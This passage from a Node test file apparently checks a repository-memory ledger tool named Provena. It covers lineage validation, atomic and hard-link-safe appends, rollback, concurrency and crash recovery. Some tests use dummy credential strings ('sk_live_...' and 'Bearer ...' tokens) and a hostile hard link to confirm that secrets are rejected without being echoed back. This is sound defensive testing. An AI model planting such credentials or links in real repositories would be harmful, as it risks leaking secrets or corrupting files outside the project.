  await writeJson(structural, "package.json", rootManifest({ dependencies: ["left"], scripts: {} }));
  const leftMap = await scanRepo(structural);
  const left = await reconcileRepoMapMemories(
    structural,
    leftMap,
    structuralInitial.memory,
    { now: () => new Date("2026-07-13T13:00:00.000Z") },
  );
  await writeJson(structural, "package.json", rootManifest({ dependencies: ["right"], scripts: {} }));
  const rightMap = await scanRepo(structural);
  const right = await reconcileRepoMapMemories(
    structural,
    rightMap,
    structuralInitial.memory,
    { now: () => new Date("2026-07-13T13:00:00.000Z") },
  );
  await assert.rejects(
    reconcileRepoMapMemories(
      structural,
      rightMap,
      snapshotFromEvents([
        ...structuralInitial.memory.events,
        left.appended[0],
        right.appended[0],
      ]),
    ),
    /invalid managed repo-map memory lineage \(multiple-heads\)/,
  );
  await assert.rejects(
    reconcileRepoMapMemories(structural, leftMap, snapshotFromEvents([left.appended[0]])),
    /invalid managed repo-map memory lineage \(orphan-predecessor\)/,
  );
  const plannedId = structuralInitial.appended[0].id;
  const collidingExplicit = prepareMemoryEvent(structural, {
    id: plannedId,
    kind: "fact",
    subjectType: "repo",
    title: "Explicit collision",
    body: "An explicit record cannot occupy Provena's deterministic managed identifier.",
    provenance: { actor: "maintainer", method: "explicit" },
    authority: "human",
    sources: [{ path: "package.json" }],
  }, { now: () => new Date(FIXED_TIME) });
  await assert.rejects(
    reconcileRepoMapMemories(structural, structuralMap, snapshotFromEvents([collidingExplicit])),
    /invalid managed repo-map memory lineage \(reserved-id-collision\)/,
  );
  const forgedBase = prepareMemoryEvent(structural, {
    id: "forged-snapshot-base",
    kind: "fact",
    subjectType: "repo",
    title: "Forged base",
    body: "This event is absent from the supplied raw ledger.",
    provenance: { actor: "maintainer", method: "explicit" },
    authority: "human",
  }, { now: () => new Date(FIXED_TIME) });
  const forgedSuccessor = prepareMemoryEvent(structural, {
    id: "forged-snapshot-successor",
    kind: "fact",
    subjectType: "repo",
    title: "Forged successor",
    body: "A successor cannot rely on an event absent from the raw ledger.",
    provenance: { actor: "maintainer", method: "explicit" },
    authority: "human",
    supersedes: [forgedBase.id],
  }, { now: () => new Date("2026-07-13T13:00:00.000Z") });
  assert.throws(
    () => extendMemoryLedgerSnapshot(
      structural,
      { ...emptySnapshot(), events: [forgedBase] },
      [forgedSuccessor],
    ),
    /memory ledger snapshot events do not match rawLedger/,
  );

  // Arbitrary valid JSONL prefixes retain exact CRLF, blank-line, and no-final-newline bytes.
  const explicitRecord = memoryEventToRecord(prepareMemoryEvent(core, {
    id: "prefix-explicit-fact",
    kind: "fact",
    subjectType: "repo",
    title: "Existing ledger prefix",
    body: "The automatic append must preserve these exact bytes.",
    provenance: { actor: "maintainer", method: "explicit" },
    authority: "human",
    sources: [{ path: "package.json" }],
  }, { now: () => new Date(FIXED_TIME) }));
  const recordLine = canonicalJson(explicitRecord).slice(0, -1);
  for (const [name, prefix] of [
    ["crlf", Buffer.from(`${recordLine}\r\n\r\n`)],
    ["blank-lines", Buffer.from(`\n\n${recordLine}\n\n`)],
    ["no-final-newline", Buffer.from(recordLine)],
  ]) {
    const prefixRoot = await temporaryRoot(`prefix-${name}`);
    await writeJson(prefixRoot, "package.json", rootManifest({ scripts: {} }));
    await writeText(prefixRoot, ".provena/memory/events.jsonl", prefix.toString("utf8"));
    const result = await refreshRepoBrain(prefixRoot, { now: () => new Date(FIXED_TIME) });
    const ledger = await readFile(join(prefixRoot, ".provena", "memory", "events.jsonl"));
    assert(ledger.subarray(0, prefix.byteLength).equals(prefix), `${name} prefix changed`);
    if (name === "no-final-newline") assert.equal(ledger[prefix.byteLength], 0x0a);
    const ledgerEntry = result.manifest.artifacts.find(
      (artifact) => artifact.path === ".provena/memory/events.jsonl",
    );
    assert.equal(ledgerEntry.bytes, ledger.byteLength);
    assert.equal(ledgerEntry.sha256, digest(ledger));
    assert.equal(result.memory.memoryFingerprint, digest(ledger));
  }

  // Atomic explicit append detaches a hostile hard link instead of mutating its outside name.
  const hardLinkContainer = await temporaryRoot("hard-link");
  const hardLinkRepo = join(hardLinkContainer, "repo");
  const outsideLedger = join(hardLinkContainer, "outside-ledger.jsonl");
  const linkedLedger = join(hardLinkRepo, ".provena", "memory", "events.jsonl");
  await mkdir(dirname(linkedLedger), { recursive: true });
  await writeFile(outsideLedger, "", "utf8");
  await link(outsideLedger, linkedLedger);
  await appendMemoryEvent(hardLinkRepo, {
    id: "hard-link-safe-append",
    kind: "fact",
    subjectType: "repo",
    title: "Hard-link-safe append",
    body: "The repository ledger replacement must not mutate another hard-link name.",
    provenance: { actor: "maintainer", method: "explicit" },
    authority: "human",
  }, { now: () => new Date(FIXED_TIME) });
  assert.equal(await readFile(outsideLedger, "utf8"), "");
  assert((await readFile(linkedLedger, "utf8")).includes("hard-link-safe-append"));

  // Candidate-controlled credentials fail before any repo-brain generation is changed.
  const secretRoot = await temporaryRoot("secret");
  await writeJson(secretRoot, "package.json", rootManifest({ scripts: {} }));
  await refreshRepoBrain(secretRoot, { now: () => new Date(FIXED_TIME) });
  const beforeSecret = await generationBytes(secretRoot);
  const secret = "sk_live_abcdefghijklmnop";
  const secretManifests = [
    rootManifest({ name: secret, scripts: {} }),
    rootManifest({ dependencies: [secret], scripts: {} }),
    rootManifest({ scripts: { [secret]: "node test" } }),
  ];
  for (const manifest of secretManifests) {
    await writeJson(secretRoot, "package.json", manifest);
    await assert.rejects(
      refreshRepoBrain(secretRoot),
      (error) => {
        assert.match(error.message, /credential|private key/);
        assert(!error.message.includes(secret), "the rejection must not echo the candidate-controlled credential");
        return true;
      },
    );
    assert.deepEqual(await generationBytes(secretRoot), beforeSecret);
    assert(!(await allPaths(join(secretRoot, ".provena"))).some((path) => path.includes(".tmp-")));
    for (const path of Object.keys(beforeSecret)) {
      const content = await readFile(join(secretRoot, ...path.split("/")), "utf8");
      assert(!content.includes(secret));
    }
  }
  const bearerSecret = "Bearer abcdefghijklmnopqrstuvwxyz1234";
  await writeJson(secretRoot, "package.json", rootManifest({ name: bearerSecret, scripts: {} }));
  await assert.rejects(refreshRepoBrain(secretRoot), (error) => {
    assert.match(error.message, /credential|private key/);
    assert(!error.message.includes(bearerSecret));
    return true;
  });
  assert.deepEqual(await generationBytes(secretRoot), beforeSecret);
  await writeJson(secretRoot, "package.json", rootManifest({ name: "sk_live_short", scripts: {} }));
  const lookalike = await refreshRepoBrain(secretRoot);
  assert.equal(lookalike.reconciliation.superseded, 1, "a non-secret lookalike still reconciles");
  await writeJson(secretRoot, "package.json", rootManifest({ name: "Bearer short-token", scripts: {} }));
  const bearerLookalike = await refreshRepoBrain(secretRoot);
  assert.equal(bearerLookalike.reconciliation.superseded, 1, "a short bearer lookalike still reconciles");

  const secretPathRoot = await temporaryRoot("secret-path");
  await writeJson(secretPathRoot, "package.json", rootManifest({ scripts: {} }));
  await refreshRepoBrain(secretPathRoot, { now: () => new Date(FIXED_TIME) });
  const beforeSecretPath = await generationBytes(secretPathRoot);
  await writeText(secretPathRoot, `${bearerSecret}/README.md`, "ordinary file\n");
  await assert.rejects(refreshRepoBrain(secretPathRoot), (error) => {
    assert.match(error.message, /credential|private key/);
    assert(!error.message.includes(bearerSecret));
    return true;
  });
  assert.deepEqual(await generationBytes(secretPathRoot), beforeSecretPath);
  await rm(join(secretPathRoot, bearerSecret), { recursive: true, force: true });
  await writeJson(secretPathRoot, "package.json", {
    ...rootManifest({ scripts: {} }),
    description: bearerSecret,
  });
  await assert.rejects(refreshRepoBrain(secretPathRoot), (error) => {
    assert.match(error.message, /credential|private key/);
    assert(!error.message.includes(bearerSecret));
    return true;
  });
  assert.deepEqual(await generationBytes(secretPathRoot), beforeSecretPath);
  await writeJson(secretPathRoot, "package.json", rootManifest({ scripts: {} }));
  await writeJson(secretPathRoot, `${bearerSecret}/package.json`, rootManifest({ scripts: {} }));
  await assert.rejects(refreshRepoBrain(secretPathRoot), (error) => {
    assert.match(error.message, /credential|private key/);
    assert(!error.message.includes(bearerSecret));
    return true;
  });
  assert.deepEqual(await generationBytes(secretPathRoot), beforeSecretPath);

  // A handled generation write failure restores all paths and removes atomic-write residue.
  const rollback = await temporaryRoot("rollback");
  const rollbackPaths = [
    ".provena/memory/events.jsonl",
    ".provena/repo.brain.md",
    ".provena/manifest.json",
  ];
  const prior = {
    [rollbackPaths[0]]: "prior-ledger\n",
    [rollbackPaths[1]]: "prior-brain\n",
    [rollbackPaths[2]]: "prior-manifest\n",
  };
  for (const [path, content] of Object.entries(prior)) await writeText(rollback, path, content);
  let writes = 0;
  await assert.rejects(
    commitRepoBrainGeneration(
      rollback,
      {
        [rollbackPaths[0]]: "next-ledger\n",
        [rollbackPaths[1]]: "next-brain\n",
        [rollbackPaths[2]]: "next-manifest\n",
      },
      rollbackPaths,
      async (repoRoot, path, content) => {
        writes += 1;
        await writeFileAtomic(repoRoot, path, content);
        if (writes === 2) throw new Error("fault-injected generation failure");
      },
    ),
    /fault-injected generation failure/,
  );
  for (const [path, content] of Object.entries(prior)) {
    assert.equal(await readFile(join(rollback, ...path.split("/")), "utf8"), content);
  }
  assert(!(await allPaths(rollback)).some((path) => path.includes(".tmp-")));

  // Same-process refreshes and an explicit-append race serialize without duplicates or torn JSONL.
  const concurrentRoot = await temporaryRoot("concurrent");
  await writeJson(concurrentRoot, "package.json", rootManifest({ scripts: { test: "node test" } }));
  const concurrentRefreshes = await Promise.all([
    refreshRepoBrain(concurrentRoot, { now: () => new Date(FIXED_TIME) }),
    refreshRepoBrain(concurrentRoot, { now: () => new Date(FIXED_TIME) }),
  ]);
  assert.deepEqual(
    concurrentRefreshes.map((result) => [result.reconciliation.added, result.reconciliation.noops]).sort(),
    [[0, 2], [2, 0]],
  );
  let concurrentSnapshot = await readMemoryLedgerSnapshot(concurrentRoot);
  assert.equal(managedEvents(concurrentSnapshot).length, 2);
  await writeJson(concurrentRoot, "package.json", rootManifest({ dependencies: ["next"], scripts: { test: "node test" } }));
  await Promise.all([
    refreshRepoBrain(concurrentRoot, { now: () => new Date("2026-07-13T13:00:00.000Z") }),
    appendMemoryEvent(concurrentRoot, {
      id: "explicit-race-fact",
      kind: "fact",
      subjectType: "repo",
      title: "Concurrent explicit fact",
      body: "The explicit append must survive a simultaneous automatic refresh.",
      provenance: { actor: "maintainer", method: "explicit" },
      authority: "human",
      sources: [{ path: "package.json" }],
    }, { now: () => new Date("2026-07-13T13:00:00.000Z") }),
  ]);
  concurrentSnapshot = await readMemoryLedgerSnapshot(concurrentRoot);
  assert.equal(concurrentSnapshot.events.filter((event) => event.id === "explicit-race-fact").length, 1);
  assert.equal(
    managedEvents(concurrentSnapshot, (managed) => managed.candidate.type === "package").length,
    2,
  );
  const converged = await refreshRepoBrain(concurrentRoot);
  assert.equal(converged.reconciliation.noops, 2);
  const convergedLedger = await readFile(join(concurrentRoot, ".provena", "memory", "events.jsonl"));
  assert.equal(converged.memory.memoryFingerprint, digest(convergedLedger));
  assert.equal(converged.manifest.memoryFingerprint, digest(convergedLedger));
  assert.equal(new Set(converged.memory.events.map((event) => event.id)).size, converged.memory.events.length);
  JSON.parse(`[${converged.memory.rawLedger.trim().split(/\r?\n/).filter(Boolean).join(",")}]`);

  // Independent Node processes serialize through the filesystem lock.
  const processRoot = await temporaryRoot("process-concurrent");
  await writeJson(processRoot, "package.json", rootManifest({ scripts: { test: "node test" } }));
  const processOutcomes = await Promise.all(
    Array.from({ length: 4 }, () => runRefreshProcess(processRoot)),
  );
  assert.deepEqual(
    processOutcomes.sort((left, right) => left[0] - right[0]),
    [[0, 2], [0, 2], [0, 2], [2, 0]],
  );
  const processSnapshot = await readMemoryLedgerSnapshot(processRoot);
  assert.equal(managedEvents(processSnapshot).length, 2);
  assert.equal(new Set(processSnapshot.events.map((event) => event.id)).size, processSnapshot.events.length);
  const processNoop = await refreshRepoBrain(processRoot);
  assert.equal(processNoop.reconciliation.noops, 2);

  // A crash after ledger publication but before derived artifacts is repaired on the next refresh.
  const crashRoot = await temporaryRoot("crash-recovery");
  await writeJson(crashRoot, "package.json", rootManifest({ scripts: { test: "node test" } }));
  await refreshRepoBrain(crashRoot, { now: () => new Date(FIXED_TIME) });
  await writeJson(crashRoot, "package.json", rootManifest({
    dependencies: ["after-crash"],
    scripts: { test: "node test" },
  }));
  const crashMap = await scanRepo(crashRoot);
  const crashBefore = await readMemoryLedgerSnapshot(crashRoot);
  const interruptedGeneration = await reconcileRepoMapMemories(
    crashRoot,
    crashMap,
    crashBefore,
    { now: () => new Date("2026-07-13T13:00:00.000Z") },
  );
  assert.equal(interruptedGeneration.reconciliation.superseded, 1);
  await publishLedgerThenCrash(crashRoot, interruptedGeneration.memory.rawLedger);
  const recoveryStartedAt = performance.now();
  const recovered = await refreshRepoBrain(crashRoot);
  assert(
    performance.now() - recoveryStartedAt < 15_000,
    "a confirmed-dead lock owner must be reclaimed before the 30-second wait timeout",
  );
  assert.equal(recovered.reconciliation.noops, 2);
  assert.equal(recovered.manifest.memoryFingerprint, interruptedGeneration.memory.memoryFingerprint);
  assert(recovered.written.includes(".provena/manifest.json"));
  for (const artifact of recovered.manifest.artifacts) {
    const bytes = await readFile(join(crashRoot, ...artifact.path.split("/")));
    assert.equal(artifact.sha256, digest(bytes), `recovered hash mismatch for ${artifact.path}`);
    assert.equal(artifact.bytes, bytes.byteLength, `recovered byte count mismatch for ${artifact.path}`);
  }
  const recoveredPackages = managedEvents(
    recovered.memory,
    (managed) => managed.candidate.type === "package",
  );
  assert.deepEqual(recoveredPackages.map((event) => metadata(event).action), ["ADD", "SUPERSEDE"]);

  console.log("repo memory reconciliation tests passed");
} finally {
  await Promise.all(roots.map((root) => rm(root, { recursive: true, force: true })));
}
